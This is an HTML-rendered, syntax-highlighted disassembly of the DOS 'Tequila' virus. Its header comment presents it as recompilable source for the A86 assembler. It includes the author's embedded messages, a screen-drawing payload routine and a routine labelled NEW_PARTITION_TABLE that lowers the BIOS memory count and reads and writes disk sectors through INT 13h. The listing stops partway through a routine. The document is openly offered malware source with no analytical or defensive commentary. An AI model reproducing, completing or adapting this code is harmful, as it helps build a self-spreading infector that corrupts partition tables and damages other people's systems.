<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>TEQUILA.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">                   </span><span class="sc1">;=============================</span><span class="sc0">
                   </span><span class="sc1">;      the tequila virus     =</span><span class="sc0">
                   </span><span class="sc1">;        a recompilable      =</span><span class="sc0">
                   </span><span class="sc1">;         dis-assembly       =</span><span class="sc0">
                   </span><span class="sc1">;    specifically designed   =</span><span class="sc0">
                   </span><span class="sc1">; for assembly to a COM file =</span><span class="sc0">
                   </span><span class="sc1">;  with the A86 assembler.   =</span><span class="sc0">
                   </span><span class="sc1">;     ++++++++++++++++++     =</span><span class="sc0">
                   </span><span class="sc1">; If you desire a "perfect"  =</span><span class="sc0">
                   </span><span class="sc1">; byte for byte source code  =</span><span class="sc0">
                   </span><span class="sc1">;match-up, the MASM assembler=</span><span class="sc0">
                   </span><span class="sc1">; must be used and the noted =</span><span class="sc0">
                   </span><span class="sc1">;instructions must be changed=</span><span class="sc0">
                   </span><span class="sc1">; to comply with MASM syntax.=</span><span class="sc0">
                   </span><span class="sc1">; In addition, all byte and  =</span><span class="sc0">
                   </span><span class="sc1">;word pointer references must=</span><span class="sc0">
                   </span><span class="sc1">; be changed from B and W to =</span><span class="sc0">
                   </span><span class="sc1">;   BYTE POINTER and WORD    =</span><span class="sc0">
                   </span><span class="sc1">;          POINTER.          =</span><span class="sc0">
                   </span><span class="sc1">;=============================</span><span class="sc0">


</span><span class="sc5">CODE_SEG</span><span class="sc0">   </span><span class="sc9">SEGMENT</span><span class="sc0">
</span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE_SEG</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE_SEG</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">CODE_SEG</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">CODE_SEG</span><span class="sc0">
</span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">0100</span><span class="sc0">
</span><span class="sc5">TEQUILA</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">

</span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">START</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">009</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00CH</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">00DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00AH</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"Welcome to T.TEQUILA's latest production."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00AH</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"Contact T.TEQUILA/P.o.Box 543/6312 St'hausen/"</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"Switzerland."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00AH</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"Loving thoughts to L.I.N.D.A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00AH</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"BEER and TEQUILA forever !"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00AH</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"$"</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"Execute: mov ax, FE03 / int 21. Key to go on!"</span><span class="sc0">


</span><span class="sc5">PROGRAM_TERMINATION_ROUTINE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc2">0CH</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0243H</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">020DH</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">0243H</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">0246H</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02AH</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">022FH</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc2">011H</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DH</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
   </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc2">0237H</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">0FFFFH</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">0243H</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">02DF</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0B800H</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">011</span><span class="sc0">
   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">030H</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">030H</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">0256H</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0B000H</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0FD8FH</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0FC18H</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">01E</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">IMUL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">IMUL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">0C</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">0A</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">
   </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc2">02B0</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">IMUL</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">IDIV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0F</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">0C</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">0A</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">IDIV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0D</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc2">0269</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0DB</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">012</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">01B8</span><span class="sc0">
   </span><span class="sc6">JL</span><span class="sc0"> </span><span class="sc2">0260</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">034</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">02A3</span><span class="sc0">
   </span><span class="sc6">JL</span><span class="sc0"> </span><span class="sc2">025D</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0BB</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">02D</span><span class="sc0">
   </span><span class="sc6">CLD</span><span class="sc0">
   </span><span class="sc6">MOVSB</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc2">02D7</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">016</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">PRINT_MESSAGE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">012</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">NEW_PARTITION_TABLE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CLI</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc2">07C00</span><span class="sc0">
   </span><span class="sc6">STI</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0413</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">012</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
   </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">022A</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0205</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">07C30</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">07C32</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">013</span><span class="sc0">
   </span><span class="sc6">RETF</span><span class="sc0">

</span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">002</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FE</span><span class="sc0">                      
</span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">04C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9</span><span class="sc0"> 
</span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">080</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004</span><span class="sc0">                

   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">07C00</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0226</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0228</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">013</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">CLD</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0409</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">09BE</span><span class="sc0">
